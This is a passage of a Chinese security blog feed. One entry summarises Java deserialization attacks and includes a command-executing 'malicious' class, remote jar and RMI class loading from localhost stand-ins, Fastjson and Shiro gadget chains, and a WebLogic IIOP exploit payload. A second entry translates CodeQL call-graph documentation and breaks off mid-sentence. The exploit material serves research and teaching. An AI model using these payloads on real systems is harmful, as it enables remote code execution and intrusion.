class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">89</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">77</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">89</span>, <span class="number">44</span>, <span class="number">18</span>, <span class="number">10</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">11</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">78</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">45</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">58</span>, <span class="number">4</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">89</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">6</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">89</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">58</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">87</span>, -<span class="number">89</span>, -<span class="number">1</span>, -<span class="number">24</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">21</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">22</span>, -<span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">52</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理Summer类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的defineClass方法定义Summer类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        demo2 loader = <span class="keyword">new</span> demo2();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line">            <span class="comment">// 反射创建Summer类，等价于 Summer t = new Summer(‘ipconfig);</span></span><br><span class="line">            testClass.getConstructor(String.class).newInstance("ipconfig");</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 恶意类 </span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Summer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Summer</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InputStream stream = (<span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader streamReader = <span class="keyword">new</span> InputStreamReader(stream, Charset.forName(<span class="string">"gbk"</span>));</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(streamReader);</span><br><span class="line">        StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String line = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            buffer.append(line).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="URLClassLoader远程加载文件回显"><a href="#URLClassLoader远程加载文件回显" class="headerlink" title="URLClassLoader远程加载文件回显"></a>URLClassLoader远程加载文件回显</h2><p> &emsp;&emsp; URLClassLoader是java.net下的类，继承了java.lang.Classloader类对象。URLClassLoader可以从远端或者本地加载jar/class文件。<br> 实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://127.0.0.1:8090/summer.jar"</span>);</span><br><span class="line"><span class="comment">//        URL url = new URL("file:e:/summer.jar");</span></span><br><span class="line"></span><br><span class="line">        URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class cls = ucl.loadClass(<span class="string">"Summer"</span>);</span><br><span class="line">        Method m = cls.getMethod(<span class="string">"Exec"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(cls.newInstance(),<span class="string">"ipconfig"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体实现步骤<a href="https://summersec.github.io/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">Java反序列化回显解决方案</a></p><hr><h1 id="Fastjson反序列化"><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h1><p>&emsp;&emsp; Fastjson在序列化的方法加入<code>SerializerFeature.WriteClassName</code>特征字段。序列化出来的结果会在开头加一个<code>@type</code>字段，值为进行序列化的类名。再将带有@type字段的序列化数据进行反序列化会得到对应的<code>实例类对象</code>。知道Fastjson这一特性，其他Fastjson反序列化细节部分就用下面两张图表示。<br>ps：这里这讨论最初的爆Fastjson反序列化漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gadget chain:</span></span><br><span class="line"><span class="comment"> *      JSON.parse()</span></span><br><span class="line"><span class="comment"> *          DefaultJSONParser.parse()</span></span><br><span class="line"><span class="comment"> *              DefaultJSONParser.parseObject()</span></span><br><span class="line"><span class="comment"> *                  JavaBeanDeserializer.deserialze()</span></span><br><span class="line"><span class="comment"> *                      JavaBeanDeserializer.parseRest()</span></span><br><span class="line"><span class="comment"> *                          FieldDeserializer.setValue()</span></span><br><span class="line"><span class="comment"> *                              Reflect.invoke()</span></span><br><span class="line"><span class="comment"> *                                  JdbcRowSetImpl.setAutoCommit()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720185616310.png" alt></p><hr><h1 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h1><p>&emsp;&emsp; <code>Shiro-550(Apache Shiro &lt; 1.2.5)</code>和<code>Shiro-721( Apache Shiro &lt; 1.4.2 )</code>。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用登录后<code>rememberMe={value}</code>去爆破正确的key值进而反序列化，对比Shiro550条件只要有<code>足够密钥库（条件比较低）</code>、Shiro721需要登录（要求比较高鸡肋）。</p><ul><li><code>Apache Shiro &lt; 1.4.2</code>默认使用<code>AES/CBC/PKCS5Padding</code>模式</li><li><code>Apache Shiro &gt;= 1.4.2</code>默认使用<code>AES/GCM/PKCS5Padding</code>模式<br>&emsp;&emsp; 简单来说流程就是将生成恶意Payload进行AES加密，然后Base64编码，然后以<code>rememberMe={value}</code>形式发送给服务器。服务器将valueBase64解码，然后将解码后数据进行AES解密，最后反序列化执行命令。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*                  Gadget chian:</span><br><span class="line">*                      DefaultSecurityManager.resolvePrincipals()</span><br><span class="line">*                          DefaultSecurityManager.getRememberedIdentity()</span><br><span class="line">*                              AbstractRememberMeManager.getRememberedPrincipals()</span><br><span class="line">*                                  CookieRememberMeManager#getRememberedSerializedIdentity()</span><br><span class="line">*                                      AbstractRememberMeManager#getRememberedPrincipals()</span><br><span class="line">*                                          AbstractRememberMeManager.convertBytesToPrincipals()</span><br><span class="line">*                                              AbstractRememberMeManager.decrypt()</span><br><span class="line">*                                                  AbstractRememberMeManager.deserialize()</span><br><span class="line">*                                                      .....................</span><br><span class="line">*                                                               ..........</span><br><span class="line">*  </span><br><span class="line">*</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="Weblogic-IIOP2551–反序列化"><a href="#Weblogic-IIOP2551–反序列化" class="headerlink" title="Weblogic IIOP2551–反序列化"></a>Weblogic IIOP2551–反序列化</h1><p>&emsp;&emsp; 这个漏洞是Weblogic第一个IIOP协议反序列化漏洞，影响范围比较广。</p><ol><li>payload使用<code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager</code>，这是Spring framework 反序列化的漏洞其中之一。</li><li>参数可控触发反序列化漏洞</li><li>2551是第一个IIOP协议的反序列化漏洞，影响很大、范围很广。</li><li>GIOP 标志 <code>47 49 4f 50</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String ip = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        String port = <span class="string">"7001"</span>;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> Hashtable&lt;String, String&gt;();</span><br><span class="line">        env.put(<span class="string">"java.naming.factory.initial"</span>, <span class="string">"weblogic.jndi.WLInitialContextFactory"</span>);</span><br><span class="line">        env.put(<span class="string">"java.naming.provider.url"</span>, String.format(<span class="string">"iiop://%s:%s"</span>, ip, port));</span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">    </span><br><span class="line">        JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(<span class="string">"rmi://127.0.0.1:1099/Exploit"</span>);</span><br><span class="line">        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">"pwned"</span>, jtaTransactionManager), Remote<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        context.bind(<span class="string">"hello"</span>, remote);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      Context.rebind()</span></span><br><span class="line"><span class="comment"> *          InitialContext.rebind()</span></span><br><span class="line"><span class="comment"> *              ContextImpl.rebind()</span></span><br><span class="line"><span class="comment"> *                  _NamingContextAnyStub.rebind_any()</span></span><br><span class="line"><span class="comment"> *                      ............</span></span><br><span class="line"><span class="comment"> *                          IIOPInputStream.read_value()</span></span><br><span class="line"><span class="comment"> *                              ValueHandlerImpl.readValue()</span></span><br><span class="line"><span class="comment"> *                                  ValueHandlerImpl.readValueData()</span></span><br><span class="line"><span class="comment"> *                                      JtaTransactionManager.readObject()</span></span><br><span class="line"><span class="comment"> *                                          JtaTransactionManager.initUserTransactionAndTransactionManager()</span></span><br><span class="line"><span class="comment"> *                                              JtaTransactionManager.lookupUserTransaction()</span></span><br><span class="line"><span class="comment"> *                                                  JndiTemplate.lookup()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 这篇文章是一遍概述，浓缩性的文章，大致内容是将我研究的内容，回归总结。将分析文章总一个压缩在压缩性质的总结。尽可能
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化 Java shiro" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java-shiro/"/>
    
  </entry>
  
  <entry>
    <title>Navigating the call graph</title>
    <link href="https://summersec.github.io/2021/03/25/Navigating%20the%20call%20graph/"/>
    <id>https://summersec.github.io/2021/03/25/Navigating%20the%20call%20graph/</id>
    <published>2021-03-25T11:01:42.000Z</published>
    <updated>2021-03-25T12:04:29.901Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Navigating-the-call-graph¶"><a href="#Navigating-the-call-graph¶" class="headerlink" title="Navigating the call graph¶"></a>Navigating the call graph<a href="https://codeql.github.com/docs/codeql-language-guides/navigating-the-call-graph/#navigating-the-call-graph" target="_blank" rel="noopener">¶</a></h1><p>CodeQL has classes for identifying code that calls other code, and code that can be called from elsewhere. This allows you to find, for example, methods that are never used.</p><blockquote><p>CodeQL有一些类用于识别调用其他代码的代码，以及可以从其他地方调用的代码。例如，这允许你找到从未使用过的方法。</p></blockquote><h2 id="Call-graph-classes"><a href="#Call-graph-classes" class="headerlink" title="Call graph classes"></a>Call graph classes</h2><p>The CodeQL library for Java provides two abstract classes for representing a program’s call graph: <code>Callable</code> and <code>Call</code>. The former is simply the common superclass of <code>Method</code> and <code>Constructor</code>, the latter is a common superclass of <code>MethodAccess</code>, <code>ClassInstanceExpression</code>, <code>ThisConstructorInvocationStmt</code> and <code>SuperConstructorInvocationStmt</code>. Simply put, a <code>Callable</code> is something that can be invoked, and a <code>Call</code> is something that invokes a <code>Callable</code>.</p><blockquote><p>Java的CodeQL库提供了两个抽象类来表示程序的调用图。Callable和Call。前者只是Method和Constructor的共同超类，后者是MethodAccess、ClassInstanceExpression、ThisConstructorInvocationStmt和SuperConstructorInvocationStmt的共同超类。简单的说，Callable就是可以被调用的东西，Call就是调用Callable的东西。</p></blockquote><p>For example, in the following program all callables and calls have been annotated with comments:</p><blockquote><p>例如，在下面的程序中，所有的可调用和调用都被注解了:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">class Super &#123;</span><br><span class="line">    int x;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public Super() &#123;</span><br><span class="line">        this(23);       &#x2F;&#x2F; call</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public Super(int x) &#123;</span><br><span class="line">        this.x &#x3D; x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public int getX() &#123;</span><br><span class="line">        return x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    class Sub extends Super &#123;</span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public Sub(int x) &#123;</span><br><span class="line">        super(x+19);    &#x2F;&#x2F; call</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public int getX() &#123;</span><br><span class="line">        return x-19;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Client &#123;</span><br><span class="line">    &#x2F;&#x2F; callable</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Super s &#x3D; new Sub(42);  &#x2F;&#x2F; call</span><br><span class="line">        s.getX();               &#x2F;&#x2F; call</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Class <code>Call</code> provides two call graph navigation predicates:</p><blockquote><p>Class Call提供了两个调用图导航谓词:</p></blockquote><ul><li><code>getCallee</code> returns the <code>Callable</code> that this call (statically) resolves to; note that for a call to an instance (that is, non-static) method, the actual method invoked at runtime may be some other method that overrides this method.</li><li>getCallee返回这个调用（静态）所解析的Callable；注意，对于一个实例（即非静态）方法的调用，在运行时实际调用的方法可能是其他一些覆盖这个方法的方法。</li><li><code>getCaller</code> returns the <code>Callable</code> of which this call is syntactically part.</li><li>getCaller返回这个调用在语法上是其一部分的Callable。</li></ul><p>For instance, in our example <code>getCallee</code> of the second call in 